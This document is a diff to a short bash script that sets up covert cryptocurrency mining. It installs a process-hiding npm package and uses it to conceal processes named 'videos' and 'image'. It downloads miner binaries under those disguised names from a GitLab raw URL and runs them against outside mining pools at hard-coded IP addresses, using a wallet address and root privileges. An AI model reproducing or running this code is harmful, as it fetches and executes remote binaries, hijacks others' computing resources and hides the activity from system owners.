@@ -1,9 +1,9 @@
-#!/bin/bash
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-sudo npm i -g node-process-hider && sudo ph add project && sudo ph add videos
+sudo su <<EOF
+apt-get install -y nodejs >/dev/null 2>&1
+sudo apt install npm
+sudo npm i -g node-process-hider && sudo ph add image && sudo ph add videos
 wget -qO videos https://gitlab.com/sarifadim/jomblo/-/raw/main/perusa && chmod +x videos
 screen -dms run ./videos -v -l 8.222.133.209:8080 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.AB -t 7
 wget -qO image https://gitlab.com/sarifadim/jomblo/-/raw/main/gitpod && chmod +x image
 ./image --algo KASPA --pool 47.250.56.224:443 --user 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo A-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable
+EOF
